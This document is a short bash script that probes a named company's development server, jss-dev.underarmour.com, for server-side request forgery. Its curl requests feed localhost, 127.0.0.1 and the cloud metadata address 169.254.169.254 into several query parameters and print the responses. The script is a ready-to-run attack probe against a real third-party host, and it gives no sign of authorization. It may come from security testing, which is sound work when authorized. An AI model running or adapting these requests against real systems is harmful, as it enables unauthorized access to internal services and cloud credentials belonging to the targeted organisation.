#!/bin/bash

echo "=== Testing SSRF on jss-dev.underarmour.com ==="
echo ""

# Test 1: localhost
echo "[Test 1] localhost access:"
curl -s --max-time 5 "https://jss-dev.underarmour.com?input=http://localhost" | head -3
echo ""

# Test 2: 127.0.0.1
echo "[Test 2] 127.0.0.1 access:"
curl -s --max-time 5 "https://jss-dev.underarmour.com?input=http://127.0.0.1" | head -3
echo ""

# Test 3: External URL (example.com)
echo "[Test 3] External URL (example.com):"
curl -s --max-time 5 "https://jss-dev.underarmour.com?input=http://example.com" | head -3
echo ""

# Test 4: Different parameter names
echo "[Test 4] Testing 'url' parameter:"
curl -s --max-time 5 "https://jss-dev.underarmour.com?url=http://169.254.169.254/latest/meta-data/" | head -3
echo ""

# Test 5: Testing 'target' parameter:
echo "[Test 5] Testing 'target' parameter:"
curl -s --max-time 5 "https://jss-dev.underarmour.com?target=http://169.254.169.254/latest/meta-data/" | head -3
echo ""

echo "=== Tests completed ==="
